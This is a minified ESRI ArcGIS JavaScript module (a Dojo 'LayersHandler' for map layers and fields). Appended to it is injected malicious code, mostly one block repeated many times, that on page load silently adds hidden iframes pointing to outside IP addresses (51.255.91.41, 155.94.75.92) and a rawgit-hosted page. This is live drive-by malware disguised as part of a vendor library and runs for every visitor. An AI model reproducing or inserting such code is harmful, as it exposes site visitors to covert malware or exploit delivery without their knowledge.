// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/promise/all esri/request".split(" "),function(l,h,g,f,k,m,n){return h([l],{declaredClass:"LayersHandler",layers:null,layerStore:[],fieldName:null,childList:null,validFieldTypes:"esriFieldTypeInteger esriFieldTypeSmallInteger esriFieldTypeDouble esriFieldTypeSingle esriFieldTypeString esriFieldTypeDate esriFieldTypeGeometry esriFieldTypeOID esriFieldTypeBlob esriFieldTypeGlobalID esriFieldTypeRaster esriFieldTypeGUID esriFieldTypeXML".split(" "),
layersOnly:!1,constructor:function(b){h.safeMixin(this,b)},getAllMapLayers:function(){var b=[],e=new k,d;this.layerStore=[];f.forEach(this.layers,g.hitch(this,function(a){if(!a.featureCollection)if("undefined"===typeof a.originOperLayer||!a.originOperLayer.layerType||"ArcGISFeatureLayer"!==a.originOperLayer.layerType&&"ArcGISImageServiceLayer"!==a.originOperLayer.layerType)if(0<a.newSubLayers.length){if(this.childList=[],"undefined"===typeof a.originOperLayer.layerType||"ArcGISTiledMapServiceLayer"!==
a.originOperLayer.layerType)f.forEach(a.layerObject.layerInfos,g.hitch(this,function(c){c={label:c.name,id:a.id+"."+c.id,url:a.originOperLayer.url+"/"+c.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[],layer:a.layerObject};this.childList.push(c);b.push(this._getLayerInfo(c))})),d={label:a.title,id:a.id,url:a.originOperLayer.url,type:"Service",checked:!1,children:this.childList,layer:a.layerObject},this.layerStore.push(d)}else"ArcGISMapServiceLayer"===a.originOperLayer.layerType&&(this.childList=
[],f.forEach(a.layerObject.layerInfos,g.hitch(this,function(c){c={label:c.name,id:a.id+"."+c.id,url:a.originOperLayer.url+"/"+c.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[],layer:a.layerObject};this.childList.push(c);b.push(this._getLayerInfo(c))})),d={label:a.title,id:a.id,url:a.originOperLayer.url,type:"MapService",checked:!1,children:this.childList,layer:a.layerObject},this.layerStore.push(d));else"undefined"===typeof a.originOperLayer.featureCollection&&(d={label:a.title,id:a.id,
url:a.url,fieldName:this.fieldName,type:"Feature Layer",checked:!1,children:[],layer:a.layerObject},b.push(this._getLayerInfo(d)),this.layerStore.push(d))}));m(b).then(g.hitch(this,function(){var a=this._controlComplete();this.emit("complete",a);e.resolve(a)}),g.hitch(this,function(){e.resolve(null)}));return e.promise},_getLayerInfo:function(b){var e=new k;b.url?0===b.url.length?e.resolve():n({url:b.url,content:{f:"json"},callbackParamName:"callback"}).then(g.hitch(this,function(d){if(d.hasOwnProperty("fields")&&
!1===this.layersOnly){var a=f.map(d.fields,g.hitch(this,function(a){return{label:a.alias,id:b.id+"."+a.name,name:a.name,type:"Field",fieldType:a.type,checked:!1}})),a=f.filter(a,g.hitch(this,function(a){return 0<=f.indexOf(this.validFieldTypes,a.fieldType)}));b.children=a}b.geometryType=d.geometryType;b.visible=!0;this.geometryTypes&&!f.some(this.geometryTypes,function(a){if(a===b.geometryType)return!0})&&(b.visible=!1);e.resolve(d)}),function(){e.resolve(null)}):e.resolve();return e.promise},_controlComplete:function(){f.forEach(this.layerStore,
function(b){if(b.children&&0<b.children.length){var e=f.filter(b.children,function(b){return b.hasOwnProperty("visible")?b.visible:!0});b.children=e;0===b.children.length&&(b.visible=!1)}});return this.store={data:{identifier:"id",label:"label",items:f.filter(this.layerStore,function(b){return b.hasOwnProperty("visible")?b.visible:!0})}}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});